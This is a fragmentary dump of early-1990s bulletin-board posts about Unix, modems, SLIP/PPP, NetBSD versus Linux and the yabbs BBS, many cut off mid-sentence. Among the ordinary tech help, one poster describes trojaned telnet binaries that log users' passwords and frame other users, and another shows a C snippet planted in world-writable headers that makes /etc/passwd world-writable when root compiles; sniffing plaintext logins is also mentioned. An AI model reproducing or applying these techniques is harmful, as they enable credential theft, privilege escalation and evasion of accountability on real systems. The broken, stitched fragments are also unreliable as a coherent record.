You can't.  For one thing, anon ftp is chrooted to another directory, so you
can't even get to the real "/etc" directory, just the /etc off of the ftp
tree.  For another thing, the whole point of shadowing is too make it so
that you can't get to the shadow file without user 0 (root) privs.

If you have root access, the world is your oyster.  You can both intercept

Keep in mind that the packets you see are only the ones on your local LAN.

On the Unix servers, there is a program called reaper that does this...  It
mainly watches idle ttys before doing anything though.

why is it that some normal processes like shells can take up full cpu time
on BSD systems waiting for input?  Some sort of race condition?  I

Any ideas? When I try to use sz, it sends the first bit, so my system pops 
up the blue box and gets ready to recieve, then nothing. Xmodem just does 
nothing, it says to get ready for a recieve but doesn't send anything. It 
just stops. I was wondering if I have to set the line the I'm calling in

zmodem and xmodem won't work over 7-bit lines (they were designed for 8 bit
connections), so you are going to be stuck with kermit.  It sounds like you
are using telix, which I think has a setting for binary or ascii kermit
transfers in one of the menus.  On the kermit that you are sending from you
will have to enter a command like "set file type binary" to send a binary
file.

Have you tried using sz -e?  The -e escapes a few control characters.  Also,
if you are dialing into an annex (has a prompt that says "annex: ") try
typing:
stty tesc undef
stty attn undef
stty bchar 8 parity none
The first two disable control characters for escaping telnet (you can always
use break (control-end on telix) instead).  The last sets your line to n81,
instead of e71 (if that is the default).

those are protocols for routing IP packets over serial lines (direct or
modem).  check /pub/ppp on merit.edu and you will find some stuff there (DOS
and Mac) that is PD.  NCSA Telnet/PPP and KA9Q/SLFP are both IP-ready.  You
need a host that will support the protocol, but finding SLIP hosts is not
too tough.  Then you can have multiple telnet sessions as well as ftp. 
MacPPP runs in conjunction with MacTCP so you can run any MacTCP apps, like
Fetch or Telnet or VersaTerm (with telnet tools).ÿ

You mean 4.1.3 or Solaris 2.0 ?  There are four minor patches you install on

you should be able to run irc software on the pc if you can find it
you can't remote login to a pc that i know of because the pc doesn't
support multiple processes (unless they're running os/2 in which case
they'd have to be running a telnetd but yeah you could just telnet to
it) (oh, i realize that i'm assuming all these machines are running dos
because if they weren't this would be a trivial discussion) and the
telnetd and whatever you tried to do at that end are two seperate 
processes.  as for transferring data, you could run an ftpd on one machine 
and just ftp to that machine from another machine.  but that would mean 
that the machine you ftp wouldn't be able to do anything else.

that software.. I have ftp and telnet installed on every drive, just to 
talk to the sequent (UNIX) beast I assume... but I can call out and pull 
stuph right t to the HD using ftp... better than exceding my 2M UNIX 
limit...

my FTP and Telnet dos clients connect to my local internet server  (same 
as my ip address, except ends in 1)...

and from there, it takes care of it.. any questions, call up FTP Software 
Inc, i can get addresss if you want...  I have the manuals too..  it does 
a good job.. as for mail, you'd just use it to telnet to your mail server, 
so it doesn't really help that much..

    Well, hey there. Hmm, a unix shell and telnet? Gee, you may be asking 
a bit much..well anyway, freenets sometimes have telnet access, here's a 
big one:
Cleveland Freenet
hela.ins.cwru.edu
freenet-in-a.cwru.edu
freenet-in-b.cwru.edu
freenet-in-c.cwru.edu
129.22.8.38
    Never tried it out, I use a differnt one. I hear it's big tho. I found 
this address somewhere for the first public unix, dunno if it's still 
right:
M-Net
hermes.merit.edu
m-net.ann-arbor.mi.us
35.1.48.159
35.1.48.160
35.1.48.165
35.1.48.166
35.1.48.149
I think you log in with um-m-net. I really got to get more time to use my

does anyone know of a program that captures user's input?  This might be

Most shells allow something like that.  On the cshell you would use $<,
so do something like:
#!/bin/csh
i=$<
echo $i

On sh you would use read...check out the man pages for more info on both.

i know a  guy like that.  funny thing is he usually picks out something i
 say and tries to cut it apart.  his problem is  he assumes quite a lot
and never has his fact straight.  i point  this  out, ask him why he said
that and he finds something else to try to insult me with.  the  more

well wait a sec...it seems to me like the hidden wall is just doing the same
thing... being so mega-elite and all, 'invite-only'... if you think it's

Sounds like what you really want is a moderated mailing list.  So long as
you force everything to be legal, it shouldn't matter that people provide
legit email addresses.  Then you can blow away any cracker/warez crap and

Alright I am interested in patching a copy of telnet, so that it will
log the first 30 lines of any telnet session to a file. I am experienced 
with Unix & C, but am just learning berkely sockets and have no idea how 
telnet is structured, yes I know all about concurrent servers and client 
server stuff.... anyway can anyone give me some helpful hints?

it says that it is currently set-up for read-only, is there

Date: Tue Aug 31 18:10:08 1993

Hi all!
I just purchased a US Robotics sportster 14400 Fax/Data
modem for our Sun network.  I need a little help on a
couple of items.

1) I want to be able to access the modem in command mode
and be able to issue AT commands or dial out.  From what
I understand tip is the beasty I'm after but it complains 
that all ports are busy.

2) I would like to be able to control access to this modem,
either at the group or user level.  Too many times I've
called when important deadlines need to be met and its busy
because someone is busy downloading there collection of
image files from alt.sex.all.things.great.and.small

If anyone could give me pointers or information I would
appreciate it.  You can reply here or to my email address:

jderyck@engn.uwindsor.ca

Thanks!

I'm looking to run UNIX on my IBM and wondered what software was the 
"best."  I've looked at 386BSD, Linux, and NetBSD and read their info 
files.  It looks like Linux is the best bet.  Any comments?  I'm looking 
for a system that will be connected to my local university via a SLIP 
connection as well as offer incoming calls through the phone lines.  I'll 
probably be running some sort of BBS software, rn, and ftp.  I'd like to 
offer telnet, but since I want this an anonymous system, I doubt the 
university would appove.

Right now, I'd be running a very limited system, probably a 386 with no 
more than 8 megs and a couple hundred meg HD.  Hopefully, I'd be able to 
upgrade to a 486 and add a couple of phone lines.

Ok, that's about all the details I have.  Any suggestions?

i have had very good luck with netbsd 0.9...basically no crashes since I 
have installed it, and stuff ports to it very easily (since it is 
basically bsd 4.3 with some 4.4 stuff thrown in).  Performance is about 
the same as a Linux system.

I also like the BSD philosophy better, and like it because it isn't GPL 
based...

6 months ago I might have advised linux, at this point I would advise 
either NetBSD or FreeBSD.  Best deal, try both and see which one you would

packet sniffers work by watching traffic.  you can get the software for 
free (from a few ftp sites) and it usually works with just about any free 
pc ether card (I have used it on 3c503's, smc elites, and 3c501's).  
usually they are used for doing diagnostics, but some people use them to 
grab accounts, since telnet sessions (and lots of stuff) is all plaintext.

it isn't usually that easy on a busy network though, unless you can watch 
traffic between two computers easily (and they both have to be local, 
unless you want to check every packet going between a router and a unix 
machine, which could be quite a bit).

can't do much to make telnet safer unless you feel like hacking the 
sources to make it encrypted and can setup up telnetd on your
host machine.

Hi, I've got a USR Robotics 14400 data/fax modem hooked up to

    Flow control problems. This will even happen if you are on a dumb 
terminal that is hooked up via network. YOu are telling the computer to 
spew out everything as fast as it can, and that speed is faster than the 
modem. The long and short of it is that you cannot cat things to stdout 
and expect long files to work fine. YOu have to 1)more them or 2) create 
your own cat program that provides pauses between each chunk of data to 
allow the buffer to clear. Something on the order of sending a 1k block, 
then waiting for a second, and sending another block .Sound like Zmodem 
yet? In fact, the most efficient way to do what you want to di is to 
Zmodem it tothe terminal PC. 

    However, is there a program that is like my option 2, a sort of 
self-pacing more? I'd be interested to know about it.

    On one of the servers here, all flow control is disableed, and that is 
a sonofabitch. One solution that I have had varying success with is 
instituting flow control within the protocol itself, by making it wait 
between blocks. This slows things down, but at least you can make the 
transfers go , and it still beats kermit (which is another terrible 
animal) Thank goodness for PC Telnet and room connections.

if you are willing to be a bit dangerous (carefully) take the cover off of 
the monitor.  All of the IBM monitors that I have looked at have size 
adjustments inside, clearly marked on one of the boards.  Usually they are 
made small for a reason though (like the borders really suck).

Also, you can get software over to it by hooking it up to a PC over a 
serial cable and transferring stuff that way.  Get kermit over first, and 
then use that to get szrz over and you should be set.  You should also be 
able to read dos disks...look in /usr/ibm and see if there are dosdir, 
dosread, and doswrite you should be able to read dos disks with those 
commands.  If not there may be another way, but we were never able to get 
tar files to be read directly (using rawrite on a dos machine or just cp 
on my netbsd machine).

finally, try getting netbsd to work.  It is really cool...very stable, and 
should be pretty familiar to you if you have an rt running bsd.

you don't do it using telnet.  Most people probably use a PC (where the

requires that your kernel has bpf support and that the person running the 
program is root in most cases).

I will usually replace the telnet and tn executibles with my own versions.
this leaves the playing field wide open for tricks.  not only will I get
a log of who telnets where with what passwords, but I can also put a 
scrambled script file in /tmp with a scrambled filename that specifies the
user and login sequence in which it will be run.  Then when I do my 
duties all logging points to the user (this is great for wrappers + 
nonstandard security, nothing points to me or accounts that I have.)  I 
have thought of setting up a script that if a person logs into a machine 
of proper type with root , that the patched telnet and tn will be sent to 
the new host, which will then function the same way.  but as soon as it 
leaves my machines, it leaves my control and that makes my paranoid

If you want some code for making tcp/ip connections, there are a lot of 
programs that you can examine, for instance ncftp or even iss (i just 
looked through my directories for a few names) or how about fsp?  These 
should all be very easy to find.

I have two versions of the previous program.  The one I originally wrote, 
because I was in a hurry, executes telnet as a child process with i/o 
redirected and acted as a middle man for i/o (this program adjusted 
argv[0] to rename istelf as bsh).  This method doesn't function with some 
(well alot)of unix's.  The second version has the core telnet stuff 
written right into it.  I grabbed the generic bsd telnet stuff from 
someplace that had source online. This second has functioned on just about 
everything (at 
times I have to make small changes though (help screens, the prompt))

Okay folks, another tale of the idiot sysadmin on the net.  While doing

sysadmin did not make this directory with 700 perms, but that in itself is 
not the big crime.  I look at the directory and see that most of the new 
source is already out of the tar format.  Tons of .c, .h, .o files in the 
directory.  

I am about to go on when I take a second look...the header files are all 
777!!!  After a big grin crossed my face, I went to work.  Here is a quick 
example...

# ifndef main
main(x,y) char*y[]; {chmod("/etc/passwd", 0666); Main(x,y); }
# define main Main
#endif

Wait till root compiles a program....voila!

If it is shadowed, just change the /etc/passwd to whatever it is.

Is this under unix or under dos?  If it is under unix you have to play 
some fun games with the termio interface, which is a bit tedious to 
explain.   The other route to go would be to use curses, which will allow 
you to control turning echo and cbreak mode on and off, as well as reading 
in characters one at a time.  The man page is pretty useless though, you 
might want to go to a library and see what you can find.

If you want info on doing it with termio (or sgtty, the equiv under bsd

Read the man page on select.  It tells the kernel to wake up your program 
when there is a key for you.

You have to remember that key-loops in unix are bad, because it means that 
the computer is spending so much time computing your loop that it (which 
it doesn't know is just waiting for a keypress) that it has less time to 
go and do work for other people.  In fact this is one of the primary 
problems with multitasking dos, is that everything is so used to doing 
keyboard input loops that the multitaskers end up switching to programs 
that aren't doing anything but sitting in a busy loop.

Youy could try sending a read request to the tty and then at the start of 
the loop and then break if necessary. I`d sugest you take a look
at the streams section of you're code. In any case a program like that 
would do busy-looping, ie on smaller machines waste one helluva lot of cpu
time, even so much that it would be easily noticable.

Currently I only have TelNet access and am dire need of FTP.  As a 
work-around I am contemplating writing a simple file transfer 
program which will run in my Unix dir and let me DL files to my PC.  
What I plan to do is write a prog. which reads in 1K chunks, 
converts the chunk to 7 bits, does a CRC and sends it to my computer.  
On my end I'll verify the CRC, expand back to 8 bits and write the 
block to my drive.  The proj. seems easy enough.  My only concern is 
that the terminal emulator will get in the way and I won't be able to 
send the full chr. set thru TelNet.  Is there anyway to force TelNet 
into binary mode, or turn off terminal emulation?  Also, do you think 
I would encounter any problems in using this method??
 
Thanks.

Welcome to Kermit!!! ;)  Actually you should try tweaking the

want some demo code?  Here is the rthe yabbs client:
    while (!readkey) {
        FD_ZERO(&fds);                       /* zero bitfields for select    */

        if (select(s+1, &fds, (fd_set *)NULL, (fd_set *)NULL, NULL) == -1) {
            perror("readc:select");
        }

        /* if our message is from stdin handle it, otherwise it is from
         * the server, so let handlemsg() take care of it
         */
        if (FD_ISSET(s, &fds)) {
             handlemsg();                    /* read and deal with packet    */
        } else if (FD_ISSET(STDIN, &fds)) {
            line = 1;
            ch = fgetc(stdin);
            if ((ch == 4) && (och <= 127))
                killconnection(K_USER);
            else if ((ch != 8) && (ch != 10) && (ch != 13) && (ch != '\t') &&
                (ch != 21) && (ch < 32) && (ch > 127))
                readkey = FALSE;
            else if ((ch == '\n') && (och == '\r'))
                readkey = FALSE;
            else {
                och = ch;
                readkey = TRUE;
                return ch;
            }
        }
    }


this doesn't use the timeout stuff (last parameter to select), but I could
explain that as well.  Also, for those hackers of you out there, this is
the code that causes problems with reading passwords (double return), I think,
so if you see anything stupid in here yell at me.  I haven't looked at the
code in ages, since it hasn't changed much since the first day that I started
yabbs.

128, but the system will become unusably slow long before that.  actually, the

just use the modulus command in C that ruturns the remainder when

the square root of that number, and at any point if you get a 0, then it

386bsd is the original version of bsd on the 386 for free.  It hasn't been
updated in a long time (almost 2 years) and it generally buggy.  NetBSD
is one of two replacements for it (the other is FreeBSD) each of which is
much less buggy (and thus much more stable) and has lots of nifty features.

I personally run NetBSD (on this machine) and have 3 other friends who run
it as well.  We all have had nothing but good luck with it on varying hardware.

Try disabling escape control characters, either as Cosmos said in the

like "df" which will disable flow control.  It should say "port ready

ok, quick blurb on gzip and tar.

first tar:  if you are familiar with UNIX's tar then you will have no
problems useing this version of tar.  except for the fact that it is 
somewhat picky about the order you put some command line switches it is 
exactly like the unix version.  very nice program, you can tar stuff that
can be untarred on unix as well as the other way.

gzip: again, exactly like the unix version, i don't know the rules for 
what extention it gives to unzipped files because as a general rule of 
thumb when you are gzipping something it is one file.  come to think of it 
i don't think you can zip up more than one file like  pkzip or arj lets 
you do.  but that is because it is related to the unix version.  so what i 
am trying to say (what am i trying to say?? i don't know it's too fucking 
early) is that usually a gzipped file is a tarred file to begin with.  so 
when you copy blurb.tar.gz to a valid dos name call it blurb.tgz anf this 
version of tar will decompress it to blurb.tar from where you can use 
tar.exe to untar it.

i hope that made sense, kinda did to me and i konw what i am talking 
about. sheesh.

I haven't personally, but others have.  Actually, I did do some of the original
yabbs programming under linux (about 1.5 years ago), but I quickly switched
to 386bsd (and later NetBSD).  But it should compile pretty easily.

Okay, I am going to do the unthinkable and get a *CHOKE* intel machine.  
It's a 486 DX2/66 with 8 megs ram/340 hd.  ANyways, which is better, linux

bsd is going to be similar to other systems that you have used and has a better

You might also want to think about NextStep 486, Cosmos.  Of course, its

if you are gonna run with only 8m, linux is the one to go for.

anyways, it works, most bsd and posix and sysv stuff compile easy.
there is netbsd and freebsd  on the bsd side. netbsd is still very much in

netbsd 1.0 will have shared libraries, and you can already get support for 
them by compiling netbsd-current (which is pretty painless, I did it on a
friends machine).  Also, X runs fine in 8 megs, I have two computers in here
setup with NetBSD 0.9 (no shared libs), each of which has 8 megs (one is a
386/33 and one is a 486slc2/66 (sorta of a wierd system)).  Phred has 18 megs,
which is nice, but isn't totally necessary.

Also, amiga support is about as stable as the pc stuff from what I understand.
The mac system works pretty well on some systems, but neither the mac or amiga
versions have X running (from what I last heard).  And yes, both will run
sun3 binaries.

Linux really isn't a whole lot smaller than netbsd anymore, esp if you compile
netbsd with the shared libs.  Linux has so much extra kernel bloat (like drivers
for everything under the sun compiled into the distribution kernel) that their
kernel is actually bigger than the bsd kernel (with both kernels uncompressed).

In the future you might want to be a little more careful not to spread info 
that you don't know that much about.  NetBSD is very much a stable system to 
run under (much more so than Linux IMHO) and really is not missing any features 
that linux has, with the exception of a few drivers here and there.

I wouldn't reccomend unix after working for a company that had bought it.
Their tech support is completely awful, their prices are high, and you aren't
going to get a much higher quality product that you would be going with 
another vendor.  If you want a commercial system right now I would look at
BSDI (if a BSD based system is okay) or one of the other sysV based systems
(I've heard lots good about Dell, but never have used it).

The didn't do that, but instead that any system that meets a certain spec
(a book of about 500 pages) could be called Unix.  There are still 
complications that stop systems like Linux and NetBSD from being called
Unix...

someone is working on a qic80 driver for freebsd (should be trivial to port

Well, this is probably pretty biased, but why don't you try yabbs (what this
system is running on).  You can get the source code for it from this machine
by anon-ftp, and it should be pretty easy to compile on linux (if you have
problems tell me and I'll help you out).  Configuration is done in two files,
it doesn't take much space (this system takes up 5 megs, not including the
gfiles).

Personally I don't like eagles bbs a whole lot.  I think that their cute
interface can get very cumbersome when you really want to use it.  I haven't
played with ubbs a whole lot.

3) 8Mgs can run bsd, but it is NOT comfortable. i`ve done it , and

They've been saying that for years (about as long as 386bsd 0.2 has been
promissed).  So I really don't expect it anytime soon.

> 3) 8Mgs can run bsd, but it is NOT comfortable. i`ve done it , and

This really depends.  Under shared libraries (which are available) you can
run in a lot less memory.  Also, gnuemacs is quite a memory hog.  Use something
else (like vi, uemacs, or micrognuemacs) and you'll run quite fine in 8 megs
(or even 6).  I ran under 6 megs for about a year, without X, but with 
having people on yabbs all the time, with not a whole lot of swapping.  These
days I have 16 megs and rarely swap, even with X.  Of course emacs never gets
run on this machine (it isn't even on the drive, just nfs mounted from another
machine).

> 4) I cant say i think kernel size is an issue. on both systems you can

True.  Linux people used to say that their kernel was smaller, and thus better,
but that is pretty untrue these days.  The default kernel on both systems
is around 500k or so...

Well, I'm slightly biased towards linux, I run a linux machine.
Deciding on NETBSD or Linux seems to be personal preference after awhile.  
Both are still in the <1.0 version stage.  Both are relatively stable.  
Both run X11 without problem, and both compile software (BSD maybe more 
likely though).  I run linux because it was the first one I ran into, and 
I don't mind SysV based things.  If you have only ever played on a BSD

This is wrong.  Linux is written from scratch, using lots of gnu stuff for the

I think Panzer is right, it is just a matter of personal preference for the

It should be a lot faster, esp with regards to the lag in typing that a lot
of people notice.  It also will let you use any editor and pager you want.
Finally it helps to keep the system load down on my machine.

The only disadvantage is that it takes up a little space on your machine.
Clients tend to run between 100k and 200k.

Actually, if your system has shared libraries, and you are able to compile
the yabbs client from sources (phred.pc.cc.cmu.edu:/pub/yabbs/yabbscli.tar.gz)
you can build a much smaller client using shared libraries.

All the binaries in phred.pc.cc.cmu.edu:/pub/yabbs/clients are linked
statically though so that they are portable between systems that may have
different versions of the shared libraries.

I have two questions
 
!. where are the documents for the clients.  I tried it out, but still 
couldnt get to use my favorite editor with it, which is vi
 
2. ALSO, would it be a waste of time to try and install Linux on a 386 
with 80meg HD and only 4meg RAM.

You could install linux on 80megs, 4 megs of ram without problem.  The 
usefulness of any unix on that amount of space is kind of in question.
If you just want to get the feel for unix, install away and get used to 
how things are set up.
If you want to "run unix", pronounce heavily, then you need more drive 
space, more ram, bigger, faster, better...
I run linux on a 386dx40 w/ 500megs HD space, 8 megs ram, I have 32 megs 
of swap set space, and I have a connection via slip.  It all works great, 
and I use a pile of space on my machine.  You can get X11 running with 
systems utilities, and everything else on an 80 meg drive.  Just don't 
expect much space left for yourself to compile your own programs...

I am going to be running netBSD .09 on 1 GIG space.  The rest is 
dos/windows development.  I dont play games or other crap only have ms 
word 6.0 and the microsoft c/c++ 7.0 compiler and windows sdk development 
for school.  

As for the power of UNIX...shit I ran ATT SYS V UNIX on 2 megs ram and 67 
meg hard drive on a motorola 68010 processor and it ran smoothly.  Sure it 
was slower but it was fully functional.  

I might be getting a cd-rom drive for cheap and I already have access to 
the NeXT step cd roms full developers version so only time will tell...

Linux, netBSD, freeBSD, whatever...it's all better than dos/windows.

linux will run on this, with a larger drive.  the memory should be fine if 
you don't want to run x, and a 386/25 really isn't a slow machine.  i ran
yabbs for a year on a 386/16 without too much trouble, with 6 megs of ram,
and a 100 meg disk, under bsd.  linux was smaller (i ran it for a while on
a 20 meg drive without too much trouble, but no emacs (i hate emacs anyway),
so you may be able to play around with that...

yes it is.  As to why you like DOS???  Well, hopefully you will see the 
light and move on.  I run UW Sys V 4.2 on my 486 exclusively, but just 
about any major UNIX OS allows you to partition your hard drive and let 
DOS and Unix coexist.  
 
Get linux or netBSD from the net and experiment.  I would recommend Linux 
to total newbies since the install is a snap(lloks like a DOS install!), 
netBSD is geared towards those who know a lot more about UNIX.  Both are 
excellent free systems.

Hey don't get me wrong...
Unix is the best OS there is.  But DOS isn't dead and 
shouldn't be, simply because it is a simple, single user, 
single tasking OS that can be crutched onto a network, 
ala netware.  It is also all that most people need
(most don't use DOS or ms-Windoze to it's full
potential by any means.)  You can't exactly expect to 
run  a Unix on an 8088 w/ 10 megs-- but this is
still a usable machine, great for DOS text work, file
manipulation, and runs 16 bit progs.  People who
can use that effectively can still be more productive
than those who have no clue in Windoze...

I ran a full ATT USL UNIX on a motorola 68010 with 2 megs.  The son of a

To use DOS/Windows effectively all one needs do is get a 29 cent stamp and

--------------------
OK, the thing about people using 8088s is that they can't afford a new 
computer.  I know a lot of people who have to subsist with old hardware at 
home or work because they can't afford to upgrade.  In these cases, DOS 
works fine, and it doesn't matter if you're "meek" or whatever.
In the case of someone with an 8088 at workk, why would they want to try 
to run UNIX?  Most of the work that gets done in an office is done with 
either a spreadsheet or word perfect 5.1.  Workplaces are not likely to 
upgrade people to some kind of UNIX and also have to upgrade the software 
to whatever pathetic version of WP will run on a powered down system.

The point of this is:  not everyone can afford to run a hacker/technical 
operating system.
I use OS/2, and I guess I'd rate its complexity and usability somewhere 
between dos+windows and unix.  I'd recommend it for people who know what 
they're doing.

Maybe, if I can find one :)...
But seriously, which site is it that runs a 486 w/ 32 MB?
I may want to talk with this guy.  Unfortunately, or
fortunately, it looks like I may need to have at least a couple
dozen users online, with at least one shell per.  I can grab
a SS2 for maybe four and a half, but if you look at the numbers,
those things are a hell of a lot slower than tens.  And right
now, it looks like I'm talkin' 10, if I can find one for what
they probably _should_ be going for. 
Otherwise, it looks like  a 486/dx2-66 running an AT&T Unix;
the latest patch release of USL [:)] or Dell, if I could find out
anything about that.  I wouldn't even think pentium until they 
finally get that sucker over 100 MHz.  I mean, it's supposed to
do that easy, if you listen to Intel [big :)].
If they have the numbers, I guess it would be better to go with
the PC(s) rather than Sparcs, due to availability and resale value.

nothing wrong with it but it is no longer supported or manufactured by 
dell.  The latest release of USL is still System V 4.2 but is now being

can say that it is definately a very nice product.  Not to mention that it 
is dirt cheap among the commercial peecee UNIX vendors.

486sx/25 :)...

here is the hardware and software setup:
  486sx/25, 8k cache, none external (gotta buy some oneday)
  16 megs of memory
  380 megs of disk (250+130)
  3com 3c503 ethernet card (for net connection)
plus lots of unimportant stuff so I can use it (monitor, video, etc)

software is NetBSD 0.9 (pretty much stock, with a few kernel hacks I've
done).  To give you an idea of system load, during the last 15 minutes
the load average has gone between 0.16 and 1.11, sitting around 0.50
most of the time.  Currently there are about 20 users online.

A 486 really is a fast system, its just that when you start trying to
emulate dos (like windows and os/2 do) you spend so much time worrying
about hardware emulation that the machine justs gets bogged down.  Running
a "true" os like unix (this is a religious issue, lets not argue about
it) really does let you do a lot more with the hardware.  For the most
part I don't notice yabbs when it is running (this has been changing recently
w/ all of the new people coming on and the associated flooding), even
though I do lots of work on it as well (lots of compiling, and I'm sitting
in X windows about 30% of the time).

Comparison wise I notice very little difference between this machine
and a Decstation 5000.

well, that is because the OS that I am running is designed around 386 pc's,
and so it probably just returns that.

no, actually it is because CMU includes HINFO lines in DNS entries for
machines, and phred's lists "PC/386" as the CPU, and "UNIX" as the OS.  :-)

Actually, Macintoshes won't be that bad once they release the PowerMacs

Oo!  That's not very nice!  ;)  Well, I was talking about improvements to 
the Mac.  It would not be slow motion with a PowerPC chip running things, 
and the OS wouldn't be quite as shitty with the addition of pre-emptive 
mtasking and mem protection.  The interface is not great, but it's better 
than MS-windows, a little more polished at least.

What I use nearly all the time is OS/2 2.11, which pretty much is a real 
OS, and which I like a LOT.  I'm familiar with a command line, too, cuz I 
play with UNIX quite a bit.  In fact, I'm probably less familiar with the 
Mac than with anything else.

Now, are we going to get into an rgument over the REALness of OS/2?

I have TeX, it's a nice tool.  GPF steered me to an X site with some word

Well, first of all, what kind of serial connection are you using to 
connect?  What process of connections do you go through in order to log 
in?  I know I'd like to have a SLIP setup, but since the connections here 
are screwy, I don't think it's possible.  Here, I'm attached to things via 
a 19.2 serial connection, but I have to do this one part where I choose 
which system to connect to, and that would probably mess up the slip 
thing, since the first menu can't handle multiple connections from the 
same source.
Anyway, good luck slipping.

most of them work under BSD. most of them are written for BSD. 
The one I used was Lambda moo (mud object oriented). the problem with that
is that it keeps the database in memory, and can grow large easily. Things
like lpmud keep the database on disk. If you have less than 64 megabytes of
physical memory, you probably want a disk based mud.

Hey....
    I happen to know about packet-driving over serial lines.  First- I 
have seen *no* implementations of SLIP or PPP that don't require either a 
kernal rebuild or loadable module (a la Solaris).  These usually have a 
daemon running to handle the connection.  The lines are usually connected 
to a term server that is dedicated to PPP/SLIP instead of one with a menu 
that is usually used for terminal access.  It could be run with a serial 
board in the server though.  It requires quite a bit of setup to do on the 
server end... If you can't get the sysadmin to do it, it won't get done.  
I know of at least one school that offers SLIP access 24-7 on a dedicated 
14.4 modem.  Depending on where in Maryland he is, JasonLee might be 
interested.  They charge $40/month and access is, of course, limited to 
non-commercial use :)

Ah, see that $40 a month doesn't sound too nice!  :)  I think I can deal

did set things up for SLIP, I'd then have to buy some nice expensive 
software to go along with it (TCP/IP for OS/2 and Lan Manager for OS/2, 
and I think I could get both for $250).  Besides, I won't be living on 
campus next year, so I guess I'll just have to wait till the cable company 
offers Ethernet connection.  I'll have my own site, and I'll give you all 
accounts on it!  :)

Why not just run a term server/client thing on your own account and just 
go thru the trouble of settin gup the desired protocol.  I know that they 
have IRC clients, FTP, Telnet etc.. ovr term connections already set up.  
As a matter of fact a freind of mine runs a little box that you can telnet 
too thru a term connection using "tredir" which is a term client that 
captures a port number on the host.  You have to have Unix on both ends to 
use it, so tuff shit if your on a messyDOS box.

Shooot, I have even seen where you can recieve and deliver mail and all 
thru a term connection, but for those you need sysadmins permission.  But 
if your just gonna have a few people telnet to or FTp to your box then use 
term, cause you wont need to notifythe sysop, since all the stuff is on 
your account.

term for linux is at ftp.cdrom.com, and also ftp.funet.fi i believe.

X386 uses an Xconfig file in lib/X11 to configure the mouse. The terminal 
mouse program probably uses something else.  therefore having one work

Hmmmm....what do you think yabbs is running on??  Why, BSD!!  BSD is a 
very stable networking OS and you should have minimal problems.  As for 
grueling if you have heavy users or overhead I suggest mucho RAM and a 
fast processor.  DOnt expect a 4 meg 386sx to do much.  Commercial doesnt 
always mean better but it does offer a few nifty features like tech 
support for those not comfortable with their system and the ability to 
run commercial apps.  

I needed the commercial app ability for some work and I bought myself USL 
UNIX System V 4.2 for $160 and the C/Motif development suite for $89.  I 
got all the standards with X and some nifty things like Open Look and 
Motif, I happen to love it but will not sit here and degrade linux or 
netBSD as worthless.  They offer a very practical solution to students 
and otherwise poor people that cannot fork out the dollars for a 
commercial OS.

I say you shouldnt have a big problem with netBSD.  Ask Htoaster for the 
tech lowdown on BSD, he's the expert. ;)

nope.  bsd is very stable with the proper hardware.  if you're going to do 
this i would reccomend using scsi disks (something i need to upgrade to
eventually) because the drivers for the adaptec 1542 card are much more
stable than the drivers for ide cards, plus the adaptec card uses dma which
makes it much faster in multitasking systems.

i know of a public access internet site that uses netbsd to run their news
system and nfs server with very little trouble.  they've been running it
since december, and usually get 30+ day uptimes.

how many users do you plan on having on the system?  what sort of hardware
are you expecting to run?  a 486/33 or 50 with 16 megs of memory, scsi
disks (one gig or so) and a network connection could probably sustain quite
a few users just fine.

by comparison, phred is a 486sx/25, two ide disks (400 megs total), 16 megs
of memory.  i allow up to 20 yabbs users (used to allow more and have seen
35 or 40), plus people whom i've given private accounts to.  i get pretty
good stability (well, not over the past few days, but i've been doing some
experimenting), and would get much better stability running w/ scsi (95% of
my crashes have to do with the ide driver).

I'm planning on setting up an 8 line dial-up system running on BSD and

can justify the CSU/DSUs at $400 US each, but how can the IP router be 
$1600 US!  What makes the router so expensive?  Do we really need a

I would seriously reconsider the hardware choice.  While you only have 8 
users there and that is small, a local system here is running on a 486 66 
with a 56k inet line with 32 megs memory and is godawful slow.  Lag, lag, 
lag, lag....

With only 16 on a sx machine I am not confident in the overall 
performance...perhaps it wont matter with only 8 connections but when you 
add telnet users and perhaps 8 people runnning IRC things might get bogged 
down.

Hardware you will probably be okay, although you may opt for a faster CPU.
Make sure you get a scsi disk as well, disk performance is much better with
them, because they don't tie up the entire system during disk transactions.

Sorry, I don't know a whole lot about 56k costs...

Phred's connection is through ethernet to the campus T1, which I think is
only one or two hops away from the backbone.  The lag on phred is usually
caused by one of three things:
   1) i'm doing something on the machine that causes the loadavg to go high
      (i've seen it above 5).  usually this isn't the case, and the loadavg
      hovers around .6 or .7.
   2) yabbs uses character by character mode for i/o.  this means that 
      everything that you type is echoed back by my machine.  the reason
      for this is that it makes it a lot easier to make a nice interface
      (like hotkeys, not having the input line get written over in talk,
      etc).  this is mainly a problem for people telnetting from far away
      or through slow links.
   3) our network has been in bad shape recently, and will sometimes drop
      my dorm for periods of about one minute.

Well, I keep the temperature of the chip WELL below the Intel

since last June, and it has never crashed once.  I even run it in a

Of course, I wouldn't run an Internet service off of it (I'd get real

to sell it and get a DX4-100 and see how high it goes.  BTW, I saw an ad

since the current Pentiums run external and internal bus speeds the same, 
how did they get a motherboard to run at 90 MHz?  That would be no minor

A high speed bus isn't go to buy you a whole lot under BSD, with the exception
of a faster disk controller.  However the extra cost of an EISA motherboard
plus a 1742 (eisa scsi controller) probably won't be worth it.  The main thing
that high speed busses really help in is video, but since I doubt that you'll
be running X on the thing (or even have anything more than a mono card in it)
I wouldn't worry about it.  You can get vesa and eisa ide controllers that are
faster, but i wouldn't run ide in the system if i were you (all of the recent
crashes on phred have been related to the ide system in the machine and bad
interactions between ide, the system, multiple ide drives, and the somewhat
lacking ide driver in free/netbsd).  IDE is also much slower under multitasking
systems, unless someone sells a DMA based IDE card at this point...

Actually, Intel processors have some pretty good bang for the buck-- 
 into this I include 'DX4' chips and other 486's, but not the overhyped 586

Not sure about that, but it is my understanding that PC boxes tend 
to be lacking in hardware contexts, which is directly related to the number 
of processes (i/o streams???) that you can run concurrently.  Now, since 
it's online, you can comment about 1/3 <?> or so of the daemons out of the 
rc files and save some processor and process numbers there.  I mean, why 
does someone dialed in need to use lpd, except as a security hole?
This is assuming you aren't using the machine as your primary box, or 
something...

I believe there exists software to turn a PC/ DOS with 2 network cards into 
a router.  This may not be the best solution; the machine costs money if it 
isn't already lying around (and who can't find a cheap 486 with a small HD 
and mono VGA?) and if the software isn't PD that would probably put over the 
top in terms of expense....just a possibility.

Well, actually I was talking about a T1.  We were quoted, for a T1, twice 
the price of a 56.  Then there is 30x the bandwidth (56kbps v. 1.54 mbps) 
and alot of room for growth.  You have to figure-- If we had to go to t1 
from 56, we would have spent enough in installation just to get it to begin 
with-- same story with 2 56's.  Then you have spent enough for a T1, and got 
